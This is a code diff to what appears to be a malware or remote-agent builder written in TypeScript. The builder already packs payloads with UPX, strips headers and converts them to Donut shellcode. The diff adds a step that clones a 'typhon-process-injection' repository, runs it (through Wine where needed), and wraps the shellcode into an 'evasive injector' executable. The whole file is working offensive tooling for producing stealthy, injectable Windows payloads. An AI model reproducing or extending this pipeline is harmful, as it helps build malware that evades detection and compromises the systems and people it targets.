@@ -87,11 +87,111 @@ type BuildProcessConfig = {
   enableUpx?: boolean;
   upxStripHeaders?: boolean;
   enableDonut?: boolean;
+  enableTyphon?: boolean;
+  typhonVariant?: string;
   requireAdmin?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
   boundFiles?: BoundFile[];
 };
+
+type TyphonInfo = { bin: string; useWine: boolean };
+
+function isPEFile(filePath: string): boolean {
+  try {
+    const fd = fs.openSync(filePath, "r");
+    const header = Buffer.alloc(2);
+    fs.readSync(fd, header, 0, 2, 0);
+    fs.closeSync(fd);
+    return header[0] === 0x4D && header[1] === 0x5A; // MZ
+  } catch {
+    return false;
+  }
+}
+
+async function isWineAvailable(): Promise<boolean> {
+  try {
+    const result = await $`wine --version`.quiet().nothrow();
+    return result.exitCode === 0;
+  } catch {
+    return false;
+  }
+}
+
+async function checkTyphonAvailable(sendToStream: (data: any) => void): Promise<TyphonInfo | null> {
+  const toolsDir = path.join(ensureDataDir(), "tools");
+
+  // Helper: resolve a found binary, checking Wine requirement on Linux
+  const resolve = async (binPath: string, label: string): Promise<TyphonInfo | null> => {
+    if (process.platform !== "linux") {
+      sendToStream({ type: "output", text: `Typhon found: ${label}\n`, level: "info" });
+      return { bin: binPath, useWine: false };
+    }
+    if (isPEFile(binPath)) {
+      if (await isWineAvailable()) {
+        sendToStream({ type: "output", text: `Typhon found: ${label} (via Wine)\n`, level: "info" });
+        return { bin: binPath, useWine: true };
+      }
+      sendToStream({ type: "output", text: `WARNING: ${label} is a Windows PE but Wine is not installed\n`, level: "warn" });
+      return null;
+    }
+    sendToStream({ type: "output", text: `Typhon found: ${label}\n`, level: "info" });
+    return { bin: binPath, useWine: false };
+  };
+
+  // 1. TYPHON_BIN env var
+  const envBin = process.env.TYPHON_BIN?.trim();
+  if (envBin && fs.existsSync(envBin)) {
+    return resolve(envBin, `${envBin} (TYPHON_BIN)`);
+  }
+
+  // 2. Check system PATH (native binary)
+  try {
+    await $`typhon`.quiet().nothrow();
+    sendToStream({ type: "output", text: `Typhon found in PATH\n`, level: "info" });
+    return { bin: "typhon", useWine: false };
+  } catch {}
+
+  // 3. Check data/tools/
+  for (const name of ["typhon.exe", "typhon"]) {
+    const localPath = path.join(toolsDir, name);
+    if (fs.existsSync(localPath)) {
+      return resolve(localPath, localPath);
+    }
+  }
+
+  // 4. On Linux: clone repo and look for a pre-built binary
+  if (process.platform === "linux") {
+    fs.mkdirSync(toolsDir, { recursive: true });
+    const srcDir = path.join(toolsDir, "typhon-src");
+
+    if (!fs.existsSync(srcDir)) {
+      sendToStream({ type: "output", text: "Cloning messecv3/typhon-process-injection...\n", level: "info" });
+      const cloneResult = await $`git clone --depth 1 https://github.com/messecv3/typhon-process-injection.git ${srcDir}`.quiet().nothrow();
+      if (cloneResult.exitCode !== 0) {
+        const err = (cloneResult.stderr.toString() || cloneResult.stdout.toString()).trim();
+        sendToStream({ type: "output", text: `WARNING: Failed to clone Typhon: ${err}\n`, level: "warn" });
+        return null;
+      }
+    }
+
+    // Check for a pre-built binary inside the cloned repo
+    for (const name of ["typhon.exe", "typhon"]) {
+      const repoBin = path.join(srcDir, name);
+      if (fs.existsSync(repoBin)) {
+        const localBin = path.join(toolsDir, name);
+        fs.copyFileSync(repoBin, localBin);
+        fs.chmodSync(localBin, 0o755);
+        sendToStream({ type: "output", text: `Typhon binary found in repo\n`, level: "info" });
+        return resolve(localBin, `${localBin} (from repo)`);
+      }
+    }
+
+    sendToStream({ type: "output", text: `WARNING: Typhon repo cloned but no pre-built binary found. Place typhon.exe in ${toolsDir} or install Wine and provide a Windows build.\n`, level: "warn" });
+  }
+
+  return null;
+}
 
 async function checkDonutAvailable(sendToStream: (data: any) => void): Promise<string | null> {
   // 1. Honour explicit override
@@ -387,7 +487,8 @@ export async function startBuildProcess(
     }
 
     let donutBin: string | null = null;
-    if (config.enableDonut) {
+    if (config.enableDonut || config.enableTyphon) {
+      // Typhon needs Donut shellcode as input, so auto-enable Donut detection when Typhon is on
       const donutFound = await checkDonutAvailable(sendToStream);
       if (!donutFound) {
         sendToStream({
@@ -398,6 +499,19 @@ export async function startBuildProcess(
         throw new Error("Donut not found");
       }
       donutBin = donutFound;
+    }
+
+    let typhonInfo: TyphonInfo | null = null;
+    if (config.enableTyphon) {
+      typhonInfo = await checkTyphonAvailable(sendToStream);
+      if (!typhonInfo) {
+        sendToStream({
+          type: "output",
+          text: "ERROR: Typhon is not available. Place typhon.exe in the data/tools/ directory, set TYPHON_BIN, or install Wine to run a Windows build on Linux. See https://github.com/messecv3/typhon-process-injection\n",
+          level: "error",
+        });
+        throw new Error("Typhon not found");
+      }
     }
 
     const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64 || config.requireAdmin);
@@ -938,6 +1052,8 @@ func runBoundFiles() {
         // Donut shellcode conversion (Windows PE → position-independent shellcode)
         // Runs after UPX so the compressed PE is used as input when both are enabled.
         // Produces a separate .bin file and leaves the original PE untouched.
+        // shellcodePath is hoisted so the Typhon step can consume it.
+        let donutShellcodePath: string | null = null;
         if (donutBin && os === "windows") {
           const donutArchMap: Record<string, string> = {
             amd64: "2",
@@ -956,6 +1072,7 @@ func runBoundFiles() {
               } else {
                 const shellcodeSize = Bun.file(shellcodePath).size;
                 sendToStream({ type: "output", text: `Donut shellcode: ${shellcodeSize} bytes → ${shellcodeName}\n`, level: "info" });
+                donutShellcodePath = shellcodePath;
                 (build.files as any[]).push({
                   name: shellcodeName,
                   filename: shellcodeName,
@@ -970,6 +1087,49 @@ func runBoundFiles() {
           } else {
             sendToStream({ type: "output", text: `WARNING: Donut shellcode conversion skipped for ${platform} (ARM not supported by Donut)\n`, level: "warn" });
           }
+        }
+
+        // Typhon process injection loader (wraps shellcode into a standalone evasive injector)
+        // Typhon supports x64 Windows only. It takes Donut shellcode (preferred) or a raw PE.
+        if (typhonInfo && os === "windows" && actualArch === "amd64") {
+          const typhonInput = donutShellcodePath || filePath;
+          const typhonOutputName = deps.sanitizeOutputName(outputName.replace(/\.[^/.]+$/, "") + "-typhon.exe");
+          const typhonOutputPath = `${outDir}/${typhonOutputName}`;
+
+          sendToStream({ type: "output", text: `Building Typhon injector for ${platform}...\n`, level: "info" });
+
+          const typhonArgs: string[] = ["-build", typhonInput, "-o", typhonOutputPath];
+          if (config.typhonVariant) {
+            typhonArgs.push("-variant", config.typhonVariant);
+          }
+
+          try {
+            let typhonResult;
+            if (typhonInfo.useWine) {
+              typhonResult = await $`wine ${typhonInfo.bin} ${typhonArgs}`.nothrow().quiet();
+            } else {
+              typhonResult = await $`${typhonInfo.bin} ${typhonArgs}`.nothrow().quiet();
+            }
+
+            if (typhonResult.exitCode !== 0) {
+              const errText = (typhonResult.stderr.toString() || typhonResult.stdout.toString()).trim();
+              sendToStream({ type: "output", text: `WARNING: Typhon build failed (exit ${typhonResult.exitCode}): ${errText}\n`, level: "warn" });
+            } else {
+              const typhonSize = Bun.file(typhonOutputPath).size;
+              sendToStream({ type: "output", text: `Typhon injector: ${typhonSize} bytes → ${typhonOutputName}\n`, level: "info" });
+              (build.files as any[]).push({
+                name: typhonOutputName,
+                filename: typhonOutputName,
+                platform,
+                version: agentVersion,
+                size: typhonSize,
+              });
+            }
+          } catch (typhonErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Typhon failed: ${typhonErr.message || typhonErr}\n`, level: "warn" });
+          }
+        } else if (typhonInfo && os === "windows" && actualArch !== "amd64") {
+          sendToStream({ type: "output", text: `WARNING: Typhon injection skipped for ${platform} (x64 only)\n`, level: "warn" });
         }
 
         if (isBatWrapper) {
